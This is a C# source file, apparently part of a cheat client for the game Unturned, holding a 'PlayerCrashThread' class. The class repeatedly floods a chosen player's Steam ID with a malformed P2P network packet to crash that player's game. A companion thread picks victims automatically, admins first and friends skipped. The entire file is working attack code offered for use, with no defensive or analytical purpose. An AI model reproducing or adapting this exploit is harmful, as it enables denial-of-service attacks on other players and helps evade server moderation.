﻿using System;
 using System.Collections.Generic;
 using System.Linq;
using System.Reflection;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thinking.Attributes;
 using Thinking.Options;
 using Thinking.Overrides;
 using Thinking.Utilities;
 using Thinking.Variables;
 using UnityEngine;

namespace Thinking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool ContinuousPlayerCrash;
        public static List<CSteamID> CrashTargets = new List<CSteamID>();
        public static CSteamID CrashTarget;

        [Thread]
        public static void Start()
        {
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif

            while (true)
            {
                while (!Provider.isConnected || Provider.isLoading || !OptimizationVariables.MainPlayer)
                    Thread.Sleep(500);
                
                SteamChannel sc = OptimizationVariables.MainPlayer.input.channel;

                byte b = (byte)sc.getCall("askInput");
                byte[] P2 =
                {
                    (byte) ESteamPacket.UPDATE_UNRELIABLE_CHUNK_BUFFER, b, 255
                };

                uint LP2 = (uint)P2.Length;
                int ch = sc.id;
                
                while (Provider.isConnected)    
                    if (CrashTarget != CSteamID.Nil)
                        SteamNetworking.SendP2PPacket(CrashTarget, P2, LP2, EP2PSend.k_EP2PSendUnreliableNoDelay, ch);
                    else
                        Thread.Sleep(500);
            }
        }

        [Thread]
        public static void CheckThread()
        {
            while (true)
            {
                if (Provider.clients.All(p => CrashTarget != p.playerID.steamID))
                {    
                    if (ContinuousPlayerCrash && Provider.clients.Count > 1)
                    {
                        CSteamID? sid = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                            .FirstOrDefault(p =>
                                p.playerID.steamID != CrashTarget && !FriendUtilities.IsFriendly(p.player))
                            ?.playerID
                            .steamID;

                        if (sid.HasValue)
                            CrashTarget = sid.Value;
                    }
                    else
                        CrashTarget = CrashTargets.Count > 0 ? CrashTargets.First(c => Provider.clients.Any(p => p.playerID.steamID == c)) : CSteamID.Nil;
                }

                Thread.Sleep(500);
            }
        }  
    }
}
